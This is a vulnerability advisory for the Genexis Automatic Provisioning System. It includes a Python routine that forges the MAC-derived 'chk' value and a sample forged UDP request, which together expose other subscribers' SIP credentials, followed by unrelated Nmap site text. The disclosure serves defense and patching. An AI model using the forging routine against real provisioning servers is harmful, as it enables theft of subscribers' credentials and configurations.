Vendor/product description:
-----------------------------
Genexis develops FTTH equipment for the optical distribution networks of ISPs
including customer premises equipment (CPE) as well as infrastructure
components, supporting triple-play services (broadband internet, IPTV and VoIP).
The Genexis Automatic Provisioning System (GAPS) is the service used to monitor,
configure and update the CPEs.
URL: <https://genexis.eu/product/gaps/>

Introduction:
-------------
Management of Genexis CPEs can be done using TR-069 or DHCP/TFTP in combination
with  UDP-based CPE commands. The CPE checks for most recent settings at startup
and performs periodic update checks. GAPS provides the configuration settings
for individual CPEs based on the device's MAC address. A configuration record
includes the following settings (among other):
 - tftp server address, used to retrieve firmware images
 - ingress and egress bitrates, according to the user's subscription
 - sip server address, used to register to a VoIP service
 - sip client credentials, used to authenticate the VoIP client
 - ...
Given the MAC address, it was found possible to retrieve the configuration
settings of other subscribers' CPEs by sending forged UDP packets to GAPS. As a
result, sensitive data such as the sip credentials are exposed.

Affected:
---------
This issue affects all versions up to 7.2.  First mitigations available after
version 6.1.

Technical Description:
----------------------
A CPE identifies itself by the MAC address of its WAN interface and a certain
"chk" value (48bit) derived from the MAC. The algorithm used to compute the
"chk" was disclosed by reverse engineering the CPE's firmware (retrieved from
the tftp server). It is possible to forge valid "chk" values for any given MAC
address using the following python routine:

def chk(mac):
    a = [int(x, 16) for x in mac.split(':', 6)]
    chk = [0] * 6

    chk[5] = 1*a[0] + 3*a[1] + 7*a[2]                            + 115 & 0xff
    chk[3] =          7*a[1] + 1*a[2] + 3*a[3]                   + 101 & 0xff
    chk[0] =                   3*a[2] + 7*a[3] + 1*a[4]          +  99 & 0xff
    chk[4] =                            1*a[3] + 3*a[4] + 7*a[5] + 114 & 0xff
    chk[1] = 3*a[0]                            + 7*a[4] + 1*a[5] + 101 & 0xff
    chk[2] = 7*a[0] + 1*a[1]                            + 3*a[5] + 116 & 0xff

    return ':'.join(['{:02x}'.format(x) for x in chk])

Example UDP message exchange (CPE <-> GAPS):
--------------------------------------------

```
> ```
> mac=000f9461cafe
> chk=90e97d8523ac
> type=OCG1018MX
> hw=0
> fw=OCG1018MX.v1.10.0.10c.bin
> stage=0

< erate=012c0000000000000000000000000000

Workaround / Fix:
-----------------
As of GAPS 6.2, GAPS provides a workaround to limit CPE requests. To further
improve security, it is advised to use MACless provisioning with random postfix
to harden the workaround.
Starting with GAPS 7.3, the GAPS protocol will support a mechanism to prevent
calculated checksums to be be valid.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
